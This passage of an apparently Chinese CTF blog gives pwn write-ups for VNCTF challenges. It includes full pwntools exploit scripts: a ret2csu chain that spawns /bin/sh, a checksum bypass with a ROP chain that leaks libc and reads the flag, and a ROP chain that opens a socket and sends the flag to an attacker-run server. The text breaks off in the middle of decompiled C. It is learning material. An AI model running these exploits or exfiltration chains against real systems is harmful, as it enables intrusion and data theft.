failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看了会<code>house of kiwi</code>不算很难，可以专门学习一波。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当没有puts函数的时候，可以使用这个方法刷新srderr泄露信息，注意这种利用方式会导致程序退出，不适合泄露libc地址（除非没开aslr）。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/02/VNCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/02/VNCTF/" class="post-title-link" itemprop="url">VNCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-03-02 20:18:05 / 修改时间：20:18:35" itemprop="dateCreated datePublished" datetime="2022-03-02T20:18:05+08:00">2022-03-02</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="vnctf"><a href="#vnctf" class="headerlink" title="vnctf"></a>vnctf</h1><h2 id="clear-got"><a href="#clear-got" class="headerlink" title="clear_got"></a>clear_got</h2><p>刚开始泄露libc地址算基地址猜版本号本地能打通，远程不行，看了wp发现用了csu,自己复现时发现<code>call [r12+rbx*8]</code>这段代码不好搞，wp也很巧妙，使用了bss上面的一个地址（能读的也只有bss段，是我疏忽了，思路挺好想到的），最后我的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#sh=remote(&#x27;node4.buuoj.cn&#x27;,26251)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    gdb.attach(sh,<span class="string">&#x27;b *0x400762&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///&#x27;</span>)</span><br><span class="line">    syscall_addr=<span class="number">0x000000000040077e</span></span><br><span class="line">    bss_addr=<span class="number">0x601000</span></span><br><span class="line">    gadget1=<span class="number">0x4007EA</span></span><br><span class="line">    gadget2=<span class="number">0x4007D0</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span>+p64(gadget1)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(<span class="number">0x600e40</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0x3b</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">    payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">    payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#r12</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r13-&gt;rdx</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)<span class="comment">#r14-&gt;rsi</span></span><br><span class="line">    payload+=p64(bss_addr)<span class="comment">#r15-&gt;edi</span></span><br><span class="line">    payload+=p64(syscall_addr)</span><br><span class="line">    payload+=p64(gadget2)</span><br><span class="line">    payload=payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    m=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)</span><br><span class="line">    m=m.ljust(<span class="number">0x3b</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    sh.send(m)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#flag&#123;0f3a2cff-55bb-4517-a7f9-d91daf946d32&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h2><p>tcp服务的模拟，他会检查上传的tcp报文的格式，传数据的时候得绕过这个检查，然后会把传上来的数据拷贝到栈上，造成了栈溢出，远程环境很容易崩，多试几次，这也是我比赛期间内唯一做出来的题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28714</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">main_addr=<span class="number">0x401A5E</span></span><br><span class="line">bss_addr=<span class="number">0x404000</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000401bb3: pop rdi; ret;</span></span><br><span class="line"><span class="string">0x0000000000401bb1: pop rsi; pop r15; ret; </span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">x000000000004a550: pop rax; ret;</span></span><br><span class="line"><span class="string">0x000000000011c371: pop rdx; pop r12; ret;</span></span><br><span class="line"><span class="string">0x0000000000066229: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000032b5a: pop rsp; ret;</span></span><br><span class="line"><span class="string">0x0000000000043ae8: pop rax; ret;</span></span><br><span class="line"><span class="string">0x0000000000001b96: pop rdx; ret;</span></span><br><span class="line"><span class="string">0x00000000000d2745: syscall; ret;</span></span><br><span class="line"><span class="string">0x0000000000003960: pop rsp; ret; </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi=<span class="number">0x0000000000401bb3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x0000000000401bb1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sumbit</span>():</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;Which?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_v5_again</span>(<span class="params">v5,string</span>):</span></span><br><span class="line">    i=<span class="built_in">len</span>(string)</span><br><span class="line">    m=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(m&lt;=i-<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> m==<span class="number">16</span>:</span><br><span class="line">            m+=<span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        s=<span class="built_in">ord</span>(string[m])+(<span class="built_in">ord</span>(string[m+<span class="number">1</span>])&lt;&lt;<span class="number">8</span>)</span><br><span class="line">        v5=v5^s</span><br><span class="line">        m+=<span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> v5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_context</span>(<span class="params">v6,i,context</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&#x27;4. Quit.\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    tcp_message=p16(<span class="number">0x766e</span>) <span class="comment">#0</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0x28b7</span>) <span class="comment">#2</span></span><br><span class="line">    tcp_message+=p32(v6) <span class="comment">#4</span></span><br><span class="line">    tcp_message+=p32(<span class="number">1</span>) <span class="comment">#8</span></span><br><span class="line">    tcp_message+=p16(i) <span class="comment">#12</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#14</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#16</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0</span>) <span class="comment">#18</span></span><br><span class="line">    tcp_message+=p16(<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">    tcp_message+=p16(<span class="number">0xffff</span>)<span class="comment">#22</span></span><br><span class="line">    tcp_message+=context</span><br><span class="line">    tcp_message=tcp_message.ljust(<span class="number">0x1000</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    v5=get_v5_again(<span class="number">0x140b</span>,tcp_message)</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(v5)</span><br><span class="line">    real_tcp_message=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tcp_message)):</span><br><span class="line">        <span class="keyword">if</span> i ==<span class="number">16</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>(v5&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> i==<span class="number">17</span>:</span><br><span class="line">            real_tcp_message+=<span class="built_in">str</span>(<span class="built_in">chr</span>((v5&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        real_tcp_message+=tcp_message[i]</span><br><span class="line">    sleep(<span class="number">7</span>)</span><br><span class="line">    sh.send(real_tcp_message)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(sh,&#x27;b *0x401A5D&#x27;)</span></span><br><span class="line">    v5=<span class="number">5131</span></span><br><span class="line">    tcp_context(<span class="number">1</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,<span class="string">&#x27;sss&#x27;</span>)</span><br><span class="line">    write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rsi_r15)+p64(write_got)*<span class="number">2</span>+p64(write_plt)+p64(main_addr)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    pop_rdx_r12=libc_base+<span class="number">0x000000000011c371</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x000000000004a550</span></span><br><span class="line">    syscall_addr=libc_base+<span class="number">0x0000000000066229</span></span><br><span class="line">    pop_rsp=libc_base+<span class="number">0x0000000000032b5a</span></span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x68</span>+<span class="number">8</span>)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi_r15)+p64(bss_addr)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x300</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rsp)+p64(bss_addr+<span class="number">0x10</span>)</span><br><span class="line">    tcp_context(<span class="number">1</span>+<span class="number">4096</span>+<span class="number">4096</span>+<span class="number">4096</span>,<span class="number">6</span>,payload)</span><br><span class="line">    sleep(<span class="number">8</span>)</span><br><span class="line">    sumbit()</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Done.\n&#x27;</span>)</span><br><span class="line">    payload=<span class="string">&#x27;./flag&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi_r15)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall_addr)+p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    payload+=p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span>+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi_r15)+p64(bss_addr+<span class="number">0x200</span>)*<span class="number">2</span></span><br><span class="line">    payload+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(syscall_addr)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span> sh.recv()</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h2><p>第一次遇见<code>close(0);close(1);close(2)</code>,以为没啥，就普通的orw,结果发现自己的read根本写不上去，查了下才发现关闭了标准输入输出，所以无法再和程序交互，无法交互我一下就想起了侧信道，但是试过发现本地可以远程还是不行，咨询了学长才明白，远程关闭了标准输入输出流即远程题目的socket也就断了，所以无法判断程序的状态了，后来研究了学长的wp和官网wp稍微搞懂了一点。</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>在远程使用<code>socket(AF_INET, SOCK_STREAM, IPPROTO_IP)</code>起一个socket客户端服务，然后使用connect连接我方服务器<code>connect(soc, (struct sockaddr *)&amp;serv_addr, sizeof(struct sockaddr_in))</code>，然后<code>write(socketfd,flag_addr.size)</code>,把flag传到我方服务器上面。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = process([&#x27;./ld.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27264</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Dump of assembler code for function backDoor:</span></span><br><span class="line"><span class="string">   0x0000000000401349 &lt;+0&gt;:	endbr64 </span></span><br><span class="line"><span class="string">   0x000000000040134d &lt;+4&gt;:	push   rbp</span></span><br><span class="line"><span class="string">   0x000000000040134e &lt;+5&gt;:	mov    rbp,rsp</span></span><br><span class="line"><span class="string">   0x0000000000401351 &lt;+8&gt;:	syscall </span></span><br><span class="line"><span class="string">   0x0000000000401353 &lt;+10&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401354 &lt;+11&gt;:	pop    rdx</span></span><br><span class="line"><span class="string">   0x0000000000401355 &lt;+12&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401356 &lt;+13&gt;:	pop    rdi</span></span><br><span class="line"><span class="string">   0x0000000000401357 &lt;+14&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401358 &lt;+15&gt;:	pop    rsi</span></span><br><span class="line"><span class="string">   0x0000000000401359 &lt;+16&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135a &lt;+17&gt;:	pop    rax</span></span><br><span class="line"><span class="string">   0x000000000040135b &lt;+18&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135c &lt;+19&gt;:	push   rax</span></span><br><span class="line"><span class="string">   0x000000000040135d &lt;+20&gt;:	pop    rcx</span></span><br><span class="line"><span class="string">   0x000000000040135e &lt;+21&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x000000000040135f &lt;+22&gt;:	mov    rdi,rcx</span></span><br><span class="line"><span class="string">   0x0000000000401362 &lt;+25&gt;:	ret    </span></span><br><span class="line"><span class="string">   0x0000000000401363 &lt;+26&gt;:	nop</span></span><br><span class="line"><span class="string">   0x0000000000401364 &lt;+27&gt;:	pop    rbp</span></span><br><span class="line"><span class="string">   0x0000000000401365 &lt;+28&gt;:	ret    </span></span><br><span class="line"><span class="string">End of assembler dump.</span></span><br><span class="line"><span class="string">0x0000000000401347: leave; ret;</span></span><br><span class="line"><span class="string">0x0000000000401014: call rax;</span></span><br><span class="line"><span class="string">0x000000000040116C                 jmp     rax</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">socket_addr=<span class="number">0x403700</span>+<span class="number">0x1a0</span></span><br><span class="line">flag_addr=<span class="number">0x403700</span>+<span class="number">0x1b0</span></span><br><span class="line">target=<span class="number">0x403700</span>+<span class="number">0x1c0</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    pop_rax=<span class="number">0x000000000040135a</span></span><br><span class="line">    pop_rdi=<span class="number">0x0000000000401356</span></span><br><span class="line">    pop_rsi=<span class="number">0x0000000000401358</span></span><br><span class="line">    pop_rdx=<span class="number">0x0000000000401354</span></span><br><span class="line">    syscall_ret=<span class="number">0x0000000000401351</span></span><br><span class="line">    leave_ret=<span class="number">0x0000000000401347</span></span><br><span class="line">    <span class="comment">#open</span></span><br><span class="line">    payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(pop_rax)+p64(<span class="number">2</span>)+p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(<span class="number">0</span>)+p64(pop_rdx)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#read</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(<span class="number">0</span>)+p64(pop_rsi)+p64(target)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0x30</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#socket(2,1,0)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">41</span>)+p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(<span class="number">1</span>)+p64(pop_rdx)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    <span class="comment">#connect(socketfd,server_addr,0x10)</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">42</span>)+p64(pop_rdi)</span><br><span class="line">    payload+=p64(<span class="number">1</span>)+p64(pop_rsi)+p64(socket_addr)</span><br><span class="line">    payload+=p64(pop_rdx)+p64(<span class="number">0x10</span>)+p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#write</span></span><br><span class="line">    payload+=p64(pop_rax)+p64(<span class="number">1</span>)+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    payload+=p64(pop_rsi)+p64(target)+p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">    payload+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">    payload=payload.ljust(<span class="number">0x1a0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="comment">#其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line">    payload+=p64(<span class="number">0x0100007f901f0002</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">&#x27;./flag&#x27;</span></span><br><span class="line">    payload=payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>注意server_addr的格式，其中ip地址和端口号都得反着写。</p>
<h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>第一看这么多的伪代码，看了一个下午才看明白，然后写脚本又花了很长时间，很麻烦，但也知道了很多东西。</p>
<h3 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h3><p>漏洞并不难以利用，但关键的是在茫茫码海中找见他，找见就很轻松了，漏洞主要来源于一下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#得到<span class="function">elf_addr</span></span><br><span class="line"><span class="function"><span class="title">if</span> <span class="params">( type == <span class="number">102</span> )</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> ( a5 &gt; <span class="number">0</span> )</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">          